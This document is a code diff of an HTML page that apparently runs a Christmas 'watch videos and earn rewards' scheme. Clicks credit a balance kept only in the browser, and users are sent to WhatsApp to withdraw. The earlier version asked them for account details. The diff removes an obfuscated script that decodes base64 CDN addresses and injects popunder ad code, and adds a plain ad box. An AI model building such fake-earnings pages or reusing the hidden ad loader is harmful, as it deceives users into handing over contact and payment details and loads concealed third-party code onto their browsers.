@@ -1,4 +1,4 @@
-I'm<!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
 <script type="text/javascript" data-cfasync="false">
@@ -137,6 +137,15 @@ I'm<!DOCTYPE html>
             color: #e63946;
             transform: scale(1.1);
         }
+
+        #adsContainer {
+            margin-top: 20px;
+            padding: 10px;
+            border: 2px solid #004e92;
+            border-radius: 10px;
+            background-color: #f1faee;
+            display: none; /* Hide the container by default */
+        }
     </style>
 </head>
 <body>
@@ -165,14 +174,7 @@ I'm<!DOCTYPE html>
             <div class="video-task" data-video-id="aHKonkJtUbo">
                 <iframe id="video-1" src="https://www.youtube.com/embed/vYHhd6Efh-0?enablejsapi=1" allowfullscreen></iframe>
                 <button class="claim-btn" onclick="claimReward(this)">Claim Reward</button>
-                
             </div>
-   <script type="text/javascript" data-cfasync="false">
-/*<![CDATA[/* */
-(function(){var u=window,z="fa75799e67eb7aedfc9fff35b8997b51",k=[["siteId",588-385+444+717-335+5160494],["minBid",0],["popundersPerIP","0"],["delayBetween",0],["default",false],["defaultPerDay",0],["topmostLayer","auto"]],v=["d3d3LmNkbjRhZHMuY29tL2Yvc2Jvb3RzdHJhcC1tb2RhbG1hbmFnZXIubWluLmpz","ZDNnNW92Zm5nanc5YncuY2xvdWRmcm9udC5uZXQvVEl4SHgvSnEvZGJhZy5taW4uY3Nz"],f=-1,s,t,i=function(){clearTimeout(t);f++;if(v[f]&&!(1762530754000<(new Date).getTime()&&1<f)){s=u.document.createElement("script");s.type="text/javascript";s.async=!0;var a=u.document.getElementsByTagName("script")[0];s.src="https://"+atob(v[f]);s.crossOrigin="anonymous";s.onerror=i;s.onload=function(){clearTimeout(t);u[z.slice(0,16)+z.slice(0,16)]||i()};t=setTimeout(i,5E3);a.parentNode.insertBefore(s,a)}};if(!u[z]){try{Object.freeze(u[z]=k)}catch(e){}i()}})();
-/*]]>/* */
-</script>
-
         </div>
 
         <div id="actions">
@@ -181,6 +183,8 @@ I'm<!DOCTYPE html>
             <button class="action-btn" onclick="handleAction('comment')">COMMENT</button>
             <button class="action-btn" onclick="handleAction('subscribe')">SUBSCRIBE</button>
         </div>
+
+        <div id="adsContainer"></div> <!-- Container for ads -->
 
         <footer>
             <p class="footer-heading">🎄 Invite Friends & Spread the Christmas Spirit! 🎅</p>
@@ -191,6 +195,8 @@ I'm<!DOCTYPE html>
     <script>
         let balance = 0;
         let claimButtonShown = false;
+        let clickCount = 0; // Track how many times the user has clicked the button
+        const maxClicks = 10; // Maximum number of ads that can be shown
 
         const loadBalance = () => {
             const savedBalance = localStorage.getItem("balance");
@@ -229,34 +235,40 @@ I'm<!DOCTYPE html>
         };
 
         const claimReward = (button) => {
-            if (claimButtonShown) {
+            if (clickCount < maxClicks) {
+                clickCount++;
                 balance += 150;
                 updateBalance();
                 saveBalance();
-                button.disabled = true;
                 button.textContent = "Claimed 🎉";
                 button.style.backgroundColor = "#ccc";
                 button.style.cursor = "not-allowed";
+
+                // Show ad
+                showAd();
+
                 alert("🎁 Congratulations! You have claimed your reward!");
-                claimButtonShown = false;  // Prevent further clicks
+            } else {
+                alert("🎄 You've reached the maximum number of claims!");
+            }
+        };
+
+        const showAd = () => {
+            if (clickCount <= maxClicks) {
+                const adsContainer = document.getElementById("adsContainer");
+                adsContainer.innerHTML = ''; // Clear previous content
+                const adElement = document.createElement('div');
+                adElement.textContent = '🎄 Advertisement: Treat yourself to more festive goodies!';
+                adsContainer.appendChild(adElement);
+                adsContainer.style.display = 'block'; // Show ads container
             }
         };
 
         const showWithdrawInstructions = () => {
-            alert("⚠️ Withdrawal Instructions:\n1. Minimum withdrawal balance: 15000 RWF.\n2. Send your payment request via WhatsApp at +250 78 000 0000.\n3. Provide your account details for payment.\n\n🎄 Enjoy your Christmas rewards!");
+            alert('To withdraw, please send us a message on WhatsApp to complete the process!');
         };
 
-        const showClaimButton = () => {
-            const claimButton = document.querySelector(".claim-btn");
-            claimButton.style.display = "inline-block";  // Show the claim button after 2 minutes
-            claimButtonShown = true;  // Allow the claim button to be clicked
-        };
-
-        window.onload = () => {
-            loadBalance();
-            alert("🎁 Exclusive rewards for watching fun Christmas videos!\nWatch the video for at least 2 minutes and make money.\n🛍️ Cash out your balance and treat yourself this Christmas!");
-            setTimeout(showClaimButton, 120000);  // Show the claim button after 2 minutes (20,000 ms)
-        };
+        window.onload = loadBalance;
     </script>
 </body>
 </html>
